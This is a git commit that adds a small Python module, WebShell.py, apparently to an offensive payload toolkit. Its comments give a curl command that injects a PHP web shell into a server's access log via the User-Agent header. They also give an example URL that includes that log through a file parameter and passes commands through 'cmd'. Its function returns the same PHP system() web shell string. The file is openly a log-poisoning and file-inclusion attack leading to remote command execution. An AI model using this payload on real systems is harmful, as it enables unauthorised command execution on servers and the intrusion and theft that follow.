3de9cb8b0e7bad102cc240b7c0b9958f8e7e1c7b
Sam Free5ide <snovvcrash@protonmail.ch>
2018-09-09 18:52:16 +0300

    Add WebShell payload

---
+++ payloads/WebShell.py
@@ -0,0 +1,15 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# First run:
+# $ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "<http://RHOST:RPORT>"
+#
+# Target URL would be (for exmaple):
+# http://RHOST:RPORT/browse.php?file=/var/log/httpd-access.log&cmd=
+#
+
+
+def genPayload(cmd):
+	"""Just a PHP web shell."""
+	return f"<?php system($_GET['{cmd}']); ?>"
